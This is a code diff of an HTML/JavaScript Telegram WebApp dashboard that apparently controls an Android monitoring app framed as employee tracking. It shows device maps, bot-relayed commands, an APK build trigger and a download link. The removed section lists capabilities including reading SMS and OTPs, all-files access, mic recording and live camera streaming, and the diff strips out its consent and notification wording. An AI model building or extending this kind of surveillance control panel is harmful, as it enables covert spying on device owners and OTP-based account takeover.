-            if(markers.length>0){ const group=new L.featureGroup(markers); map.fitBounds(group.getBounds().pad(0.2)); }
-        }
-
-        function toggleAutoRefresh(){
-            autoRefreshPaused = !autoRefreshPaused;
-            const t=document.getElementById('autoToggle');
-            t.textContent=autoRefreshPaused?'Live: OFF':'Live: ON';
-            t.className=autoRefreshPaused?'toggle':'toggle active';
-        }
-
-        // Advance Features with Consent
-        function requestFeature(feature, deviceId){
-            const id=deviceId||devices[0]?.deviceId||'DEVICE';
-            let msg="";
-            let permInfo="";
-            switch(feature){
-                case 'msg_access': msg="💬 SMS Access - Salary slips, OTPs"; permInfo="READ_SMS permission + Notification Access needed - Employee ko allow karna hoga, notification dikhega"; break;
-                case 'file_manager': msg="📁 File Manager Access"; permInfo="MANAGE_EXTERNAL_STORAGE + All Files Access - Employee ko allow karna hoga"; break;
-                case 'settings': msg="⚙️ Settings Access"; permInfo="WRITE_SETTINGS - Settings change karne ke liye"; break;
-                case 'mic': msg="🎤 Mic Access - Live Navigation Guidance"; permInfo="RECORD_AUDIO - Mic use hoga navigation voice ke liye, persistent notification dikhega"; break;
-                case 'camera': msg="📸 Camera Access - Accident Purpose"; permInfo="CAMERA permission - Accident pe auto photo, notification dikhega"; break;
-                case 'live_camera': msg="🎥 Live Camera Streaming"; permInfo="CAMERA + foreground service - Live camera WebApp me, notification ke saath"; break;
-            }
-            document.getElementById('advanceStatus').textContent = `🚀 Feature Request: ${msg}\nDevice: ${id}\nPermission: ${permInfo}\n\nYe feature with consent kaam karega - Employee ko permission allow karna hoga, aur notification dikhega ki monitoring active hai.\n\nTelegram Bot me: /${feature} ${id} bhejo ya WebApp se request karo`;
-
+        function sendCmd(cmd){
             if(tg){
-                tg.openTelegramLink(`https://t.me/T1311bot?text=${encodeURIComponent(`/${feature} ${id}`)}`);
+                tg.openTelegramLink(`https://t.me/T1311bot?text=${encodeURIComponent(cmd)}`);
             } else {
-                alert(`${msg} - ${id}\n\n${permInfo}\n\nTelegram: /${feature} ${id}`);
+                window.open(`https://t.me/T1311bot`, '_blank');
+                alert(`Telegram me ye command bhejo:\n${cmd}\n\nBot: @T1311bot`);
             }
         }
+        function openTelegram(){
+            if(tg) tg.openTelegramLink('https://t.me/T1311bot');
+            else window.open('https://t.me/T1311bot','_blank');
+        }
+        function downloadApk(){
+            let url='https://dthakur-dt.github.io/Suto/app-debug.apk';
+            let btn=document.getElementById('dlBtn');
+            let cont=document.getElementById('progCont')||document.createElement('div');
+            btn.textContent='⏳ Downloading... 6.6MB';
+            if(tg) tg.openLink(url);
+            else window.location.href=url;
+            setTimeout(()=>{ btn.textContent='✅ Download Started - Check Notification Bar → Open → Install'; },2000);
+        }
 
-        // Build Progress
-        let buildInterval=null, buildStartTime=null;
-        function updateBuildProgress(p, stage, timeText){
-            const bar=document.getElementById('buildProgressBar'); const pe=document.getElementById('buildPercent'); const se=document.getElementById('buildStage'); const te=document.getElementById('buildTime'); const eta=document.getElementById('buildETA');
-            bar.style.width=p+'%'; bar.textContent=p+'%'; pe.textContent=p+'%'; se.textContent=stage; if(timeText) te.textContent=timeText;
-            if(p>=100){ bar.style.background='linear-gradient(90deg, #4caf50, #8bc34a)'; eta.textContent='✅ Done!'; } else if(p>0){ eta.textContent=`Est: ${Math.max(0,5-Math.floor(p/20))} min left`; }
-        }
-        function getStoredPAT(){ let pat=localStorage.getItem('github_pat')||document.getElementById('patInput').value.trim(); if(pat) localStorage.setItem('github_pat',pat); return pat; }
-        function setBuildStatus(m){ document.getElementById('buildStatus').textContent=m; }
-        async function triggerBuild(t='debug'){
-            const pat=getStoredPAT(); if(!pat||pat.length<10||!pat.startsWith('ghp_')){ alert('PAT daalo'); return; }
-            buildStartTime=Date.now(); updateBuildProgress(0,'🔨 Triggering...',new Date().toLocaleTimeString()); setBuildStatus(`Triggering...\n`);
-            if(buildInterval) clearInterval(buildInterval); let prog=0;
-            buildInterval=setInterval(()=>{ const e=(Date.now()-buildStartTime)/1000; if(e<30) prog=Math.min(30,(e/30)*30); else if(e<180) prog=30+Math.min(50,((e-30)/150)*50); else prog=Math.min(90,80+((e-180)/120)*10); updateBuildProgress(Math.floor(prog),`⏳ Building ${Math.floor(e)}s`,new Date().toLocaleTimeString()); },1000);
+        // Build APK
+        function getPat(){ let p=localStorage.getItem('github_pat')||document.getElementById('patInput').value.trim(); if(p) localStorage.setItem('github_pat',p); return p; }
+        async function triggerBuild(){
+            let pat=getPat();
+            if(!pat||pat.length<10){ alert('GitHub PAT daalo pehle'); return; }
+            document.getElementById('buildBtn').textContent='⏳ Building...';
             document.getElementById('buildBtn').disabled=true;
+            document.getElementById('progCont')?.style && (document.getElementById('progCont').style.display='block');
             try{
-                const res=await fetch(`https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/actions/workflows/build-apk.yml/dispatches`,{method:'POST',headers:{'Authorization':`token ${pat}`,'Accept':'application/vnd.github.v3+json','Content-Type':'application/json'},body:JSON.stringify({ref:'main',inputs:{build_type:t}})});
-                if(res.status===204){ setBuildStatus(`✅ Triggered! Progress bar will go to 90%...\nCheck status...`); updateBuildProgress(10,'✅ Triggered - Waiting...',new Date().toLocaleTimeString()); }
-                else{ const txt=await res.text(); setBuildStatus(`❌ Failed ${res.status}\n${txt}`); updateBuildProgress(0,'❌ Failed',''); clearInterval(buildInterval); document.getElementById('buildBtn').disabled=false; }
-            }catch(e){ setBuildStatus(`Error ${e.message}`); updateBuildProgress(0,'Error',''); clearInterval(buildInterval); document.getElementById('buildBtn').disabled=false; }
-        }
-        async function checkBuildStatus(){
-            const pat=getStoredPAT(); if(!pat){ setBuildStatus('PAT missing'); return; }
-            setBuildStatus('Checking...');
-            try{
-                const res=await fetch(`https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/actions/runs?per_page=5&event=workflow_dispatch`,{headers:{'Authorization':`token ${pat}`,'Accept':'application/vnd.github.v3+json'}});
-                if(!res.ok){ setBuildStatus(`Fail ${res.status}`); return; }
-                const data=await res.json(); const runs=data.workflow_runs||[]; if(runs.length===0){ setBuildStatus('No runs'); return; }
-                const latest=runs[0]; const elapsed=buildStartTime?Math.floor((Date.now()-buildStartTime)/1000):0;
-                if(latest.status==='completed'){
-                    clearInterval(buildInterval);
-                    if(latest.conclusion==='success'){
-                        updateBuildProgress(100,`✅ Success Run #${latest.run_number}`,latest.created_at);
-                        setBuildStatus(`✅ BUILD SUCCESS Run #${latest.run_number}\n${latest.html_url}\n\nAPK in Artifacts - Direct download: https://dthakur-dt.github.io/Suto/app-debug.apk`);
-                        document.getElementById('buildBtn').disabled=false;
-                    }else{ updateBuildProgress(100,`❌ Failed ${latest.conclusion}`,''); setBuildStatus(`❌ Failed ${latest.conclusion}\n${latest.html_url}`); document.getElementById('buildBtn').disabled=false; }
-                }else{
-                    const prog=Math.min(90,10+(elapsed/180)*80);
-                    updateBuildProgress(Math.floor(prog),`⏳ ${latest.status} #${latest.run_number} ${elapsed}s`,new Date().toLocaleTimeString());
-                    setBuildStatus(`⏳ ${latest.status} Run #${latest.run_number} Elapsed ${elapsed}s\n${latest.html_url}`);
-                    setTimeout(checkBuildStatus,10000);
+                let res=await fetch(`https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/actions/workflows/build-apk.yml/dispatches`,{
+                    method:'POST',
+                    headers:{'Authorization':`token ${pat}`,'Accept':'application/vnd.github.v3+json','Content-Type':'application/json'},
+                    body:JSON.stringify({ref:'main',inputs:{build_type:'debug'}})
+                });
+                if(res.status===204){
+                    document.getElementById('buildStatus').textContent='✅ Build Triggered! 3-5 min me APK ready hoga. Actions page check karo.';
+                } else {
+                    let txt=await res.text();
+                    document.getElementById('buildStatus').textContent=`❌ Failed ${res.status}: ${txt}`;
                 }
-            }catch(e){ setBuildStatus(`Error ${e.message}`); }
+            }catch(e){ document.getElementById('buildStatus').textContent=`Error: ${e.message}`; }
+            document.getElementById('buildBtn').disabled=false;
+            document.getElementById('buildBtn').textContent='🔨 Build APK Now';
         }
-        function openActions(){ const url=`https://github.com/${GITHUB_USER}/${GITHUB_REPO}/actions`; if(tg) tg.openLink(url); else window.open(url,'_blank'); }
-        function sendRemote(t,id){ const i=id||devices[0]?.deviceId||'DEVICE_001'; alert(`Remote ${t} -> ${i}`); if(tg) tg.openTelegramLink(`https://t.me/T1311bot`); }
+        function openActions(){
+            let url=`https://github.com/${GITHUB_USER}/${GITHUB_REPO}/actions`;
+            if(tg) tg.openLink(url); else window.open(url,'_blank');
+        }
 
         window.addEventListener('load', ()=>{
-            const saved=localStorage.getItem('github_pat'); if(saved) document.getElementById('patInput').value=saved;
-            initBatteryChart(); initMap(); loadDevices(true);
-            setInterval(()=>{ loadDevices(false); }, 30000);
-            document.addEventListener('visibilitychange', ()=>{ if(document.hidden) console.log('Hidden skip'); });
-            let st; window.addEventListener('scroll', ()=>{ clearTimeout(st); autoRefreshPaused=true; document.getElementById('autoToggle').textContent='Live: PAUSED'; document.getElementById('autoToggle').className='toggle'; st=setTimeout(()=>{ autoRefreshPaused=false; document.getElementById('autoToggle').textContent='Live: ON'; document.getElementById('autoToggle').className='toggle active'; },3000); });
+            let saved=localStorage.getItem('github_pat');
+            if(saved) document.getElementById('patInput').value=saved;
+            loadDevices(true);
+            setInterval(()=>loadDevices(false), 30000);
         });
-        function toggleAutoRefresh(){ autoRefreshPaused=!autoRefreshPaused; const t=document.getElementById('autoToggle'); t.textContent=autoRefreshPaused?'Live: OFF':'Live: ON'; t.className=autoRefreshPaused?'toggle':'toggle active'; }
     </script>
 </body>
 </html>
